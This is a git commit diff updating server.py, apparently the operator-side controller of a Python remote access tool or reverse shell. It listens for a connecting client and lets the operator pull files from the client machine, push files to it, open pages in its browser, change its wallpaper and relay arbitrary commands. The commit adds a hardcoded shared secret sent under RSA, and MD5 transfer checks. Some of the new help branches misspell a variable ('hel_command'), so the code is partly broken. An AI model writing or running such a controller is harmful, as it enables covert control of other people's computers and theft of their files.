44e1bdaaa5be5cb80a7fa68b1039e064775ef13c
Baddou Salah Eddine <sed.baddou@gmail.com>
2017-01-23 15:26:53 +0000

    Update server.py

--- server.py
+++ server.py
@@ -1,39 +1,54 @@
 #!/usr/bin/env python
+
 import socket 
 import os      
 import threading
 import subprocess
 import hashlib
+import Crypto
+import socket
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES
+
+
+secret='SECRET P@$$w0rd_ N33DS TO B3 b!G'
 
 
 
 def download(conn,command):
 
-
-	x,dest,src=map(str,command.split('*'))
+	x,src,dst=map(str,command.split(' '))
 	conn.send(command)
-	f = open(dest,'wb') 
+	f = open(dst,'wb') 
 	bits = conn.recv(1024)
 	while bits!='': 
 		if 'Unable to find out the file' in bits:
 			print '[-] Unable to find out the file'
 			break
-		f.write(bits)
-		bits=conn.recv(1024)
+		if not bits.endswith('DONE'):
+			f.write(bits)
+		
 		if bits.endswith('DONE'):
 			bits=bits.replace('DONE','')
 			f.write(bits)
 			f.close()
 			break
-		
+		bits=conn.recv(1024)
+
+	md5_sv=hashlib.md5(open(dst,'rb').read()).hexdigest()	
+	conn.send(md5_sv)
+	if conn.recv(1024)=='md5 OK':
+		print '[+] MD5 Checksum Verified, File Downloaded Succesfully !'
+	else :
+		print '[-] MD5 Checksum Not Verified, File not Downloaded Succesfully'
+	
 	
         
     
 def upload(conn,command):
 
 
-
-	x,src,dst=map(str,command.split('*'))
+	x,src,dst=map(str,command.split(' '))
 	conn.send(command)
 	file_to_send=open(src,'rb')
 	packet=file_to_send.read(1024)
@@ -46,38 +61,63 @@ def upload(conn,command):
 	conn.send(md5_sv)
 	print md5_sv
 	if conn.recv(1024)=='md5 OK':
-		print '[+] md5 Verified, File Uploaded Succesfully'
+		print '[+] MD5 Checksum Verified, File Uploaded Succesfully !'
+	else :
+		print '[-] MD5 Checksum not Verified !'
 
 
 def _help():
 	subprocess.call('clear',shell=True)
-	print 'The list of the available commands are : terminate,username,download,change_desktop_bg,browse,clear\n'
-	print 'To see the manual of each command type command() ex:download() , to exit this menu type exit()\n' 
+	print 'To see the manual of each command type help(command) ex:help(download) , to exit this menu type exit\n' 
 	
 	while True:
-		help_command=str(raw_input('Help#)'))
-		if help_command=='exit()':
+		help_command=str(raw_input('Help)'))
+		if help_command=='exit':
 			break
-		elif help_command=='terminate()':
-			print 'terminate() ends the session'
-		elif help_command=='download()':
-			print 'download() downloads a file from the client machine the usage is download #source #dest'
-		elif help_command=='upload()':
-			print 'upload() uploads a file to the client machine the usage is upload #source #dest'
+		elif help_command=='help(terminate)':
+			print 'terminate ends the session'
+		elif help_command=='help(download)':
+			print 'download => downloads a file from the client machine ex: download #source #dest'
+		elif help_command=='help(upload)':
+			print 'upload => uploads a file to the client machine ex: upload #source #dest'
+		elif hel_command=='help(username)':
+			print 'username => returns the username of the client session'
+		elif hel_command=='help(browse)':
+			print 'browse => launches a web page in the client browser ex: browse www.google.com'
+		elif hel_command=='help(change_desktop_bg)':
+			print 'change_desktop_bg => changes the desktop background of the client ex : change_desktop_bg #path_of_image'
 	return
+
+def _list():
+	print '\nAvailable commands:'
+	print '\nupload\ndownload\nclear\nhelp\nchange_desktop_bg\nbrowse\n'	
+
 
 def connect():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(("192.168.1.9", 8081))
+        s.bind(('192.168.1.2', 8080))
         s.listen(100)
         print '[+] Listening for incoming TCP connection on port 8080'
         conn,addr=s.accept()
         print '[+] We got a connection from: ', addr[0]
+
         username=conn.recv(1024)
-        print 'username is',username
-        print 'To see the lists of available commands please type help()'
+
+        client_public_text=conn.recv(1024)
+        client_public=RSA.importKey(client_public_text)
+
+        secret_encrypted=client_public.encrypt(secret, None)
+
+        conn.send(secret_encrypted[0])
+
+        client_secret=conn.recv(1024)
+        if client_secret==secret:
+            print 'The secret key was sent successfully'
+
+        print 'To go to the menu of the manual of commands type help \n'
+        print 'To list the available commands type ?\n'
         while True:   
-                command=raw_input(">")		
+               	command=raw_input(">")		
                 if 'terminate' in command:
                         conn.send('terminate')
                         conn.close() 
@@ -95,13 +135,18 @@ def connect():
                 elif 'clear' in command:
                 		subprocess.call('clear',shell=True)
                 		pass
-                elif command=='help()':
+                elif command=='help':
                 		_help()
+                elif command=='?':
+                		_list()
+                elif command=='':
+                		pass
                 else :	
-                        conn.send(command) 
+                        conn.send(command)
                         print conn.recv(1024)
         
 def main ():
+	subprocess.call('clear',shell=True)
 	connect()
 main()
 
